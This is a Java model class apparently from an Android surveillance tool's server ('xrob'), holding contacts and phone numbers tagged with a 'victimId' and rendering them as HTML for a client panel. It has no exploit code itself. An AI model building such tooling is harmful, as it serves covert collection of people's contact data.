package com.theah64.xrob.api.models;

import com.theah64.xrob.api.utils.clientpanel.TimeUtils;

import java.util.List;

/**
 * Created by theapache64 on 4/9/16,11:39 AM.
 */
public class Contact {

    private final String victimId, androidContactId, id, name;
    private final String preNames;
    private final String relativeSyncTime;
    private List<PhoneNumber> phoneNumbers;

    public Contact(String victimId, String androidContactId, String id, String name, List<PhoneNumber> phone, String preNames, long syncedAt) {
        this.victimId = victimId;
        this.androidContactId = androidContactId;
        this.id = id;
        this.name = name;
        this.phoneNumbers = phone;
        this.preNames = preNames;
        this.relativeSyncTime = TimeUtils.getRelativeTime(syncedAt);
    }


    public String getId() {
        return id;
    }

    public String getVictimId() {
        return victimId;
    }

    public String getName() {
        return name;
    }

    public List<PhoneNumber> getPhone() {
        return phoneNumbers;
    }

    public String getPreNames() {
        return preNames;
    }

    @Override
    public String toString() {
        return "Contact{" +
                "victimId='" + victimId + '\'' +
                ", androidContactId='" + androidContactId + '\'' +
                ", id='" + id + '\'' +
                ", name='" + name + '\'' +
                ", phoneNumbers=" + phoneNumbers +
                '}';
    }

    public String getAndroidContactId() {
        return androidContactId;
    }

    public static String getHtmlizedPhoneNumberAndTypes(List<PhoneNumber> phone) {

        if (phone != null) {
            final StringBuilder htmlBuilder = new StringBuilder();
            for (final Contact.PhoneNumber phoneNumber : phone) {
                htmlBuilder.append("<span class=\"phone_number pull-left\"> ").append(phoneNumber.getPhone()).append("</span> <span class=\"label ").append(PhoneNumber.getBootstrapLabelClass(phoneNumber.getType())).append(" pull-right\">").append(phoneNumber.getType()).append("</span></br>");
            }
            return htmlBuilder.toString();

        } else {
            return "-";
        }

    }


    public String getRelativeSyncTime() {
        return relativeSyncTime;
    }


    public static class PhoneNumber {

        private String contactId;
        private final String phone;
        private final String type;

        private static final String TYPE_MOBILE = "MOBILE";
        private static final String TYPE_HOME = "HOME";

        public PhoneNumber(String contactId, String phone, String type) {
            this.contactId = contactId;
            this.phone = phone;
            this.type = type;
        }

        public String getContactId() {
            return contactId;
        }

        public String getPhone() {
            return phone;
        }

        public String getType() {
            return type;
        }

        @Override
        public String toString() {
            return "PhoneNumber{" +
                    "contactId='" + contactId + '\'' +
                    ", phone='" + phone + '\'' +
                    ", type='" + type + '\'' +
                    '}';
        }

        public void setContactId(String contactId) {
            this.contactId = contactId;
        }

        public static String getBootstrapLabelClass(String type) {
            switch (type) {
                case TYPE_MOBILE:
                    return "label-primary";
                case TYPE_HOME:
                    return "label-info";
                default:
                    return "label-danger";
            }
        }

    }
}
